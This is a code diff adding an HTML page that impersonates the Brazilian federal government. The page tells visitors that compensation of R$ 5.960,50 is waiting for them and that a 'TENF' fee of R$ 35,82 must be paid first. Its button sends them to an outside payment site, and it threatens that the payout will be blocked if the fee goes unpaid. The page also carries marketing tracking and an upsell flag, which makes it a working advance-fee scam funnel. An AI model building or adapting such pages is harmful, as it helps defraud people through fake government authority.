@@ -1,0 +1,55 @@
+﻿<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Pagamento - Governo Federal</title>
+    <link rel="stylesheet" href="up1/css/styles.css">
+    <script>
+        localStorage.setItem("upsell", "up2");
+    </script>
+</head>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<body>
+    <div class="container">
+        <div style="width: 100%; text-align: center; margin: auto;">
+            <img src="up1/images/GOV-1.png" alt="Governo Federal" class="logo" style="width: 100%; max-width: 130px;">
+        </div>
+
+        <div class="amount">
+            <div class="amount-label">Indenização disponível:</div>
+            <div class="amount-value">R$ 5.960,50</div>
+        </div>
+
+        <div class="tax-box">
+            <div class="tax-box-title">TENF (Taxa de Emissão de Nota Fiscal)</div>
+            <div class="tax-box-value">R$ 35,82</div>
+        </div>
+
+        <button id="paymentButton" class="button" link="" rel="stylesheet" onclick="checkout(event)">Efetuar pagamento da Taxa</button>
+        <script>
+            function checkout(event) {
+                event.preventDefault();
+                var currentUrlParams = window.location.search;
+                window.location.href = "https://pay.taxaderestituicao.site/nWrxGWk0Qd6G654" + currentUrlParams;
+            }
+        </script>
+        <div id="loadingMessage">Gerando código PIX...</div>
+
+        
+
+        <div class="info-box">
+            Para receber o valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). Que
+            corresponde ao custo gerado por transferências de alto valor, após o pagamento será feito a transferência
+            imediata da sua indenização para sua chave pix cadastrada. Caso não conclua o pagamento dessa taxa, sua
+            indenização será bloqueada.
+        </div>
+    </div>
+    <script src="up1/js/script.js"></script>
+
+
+</body></html>
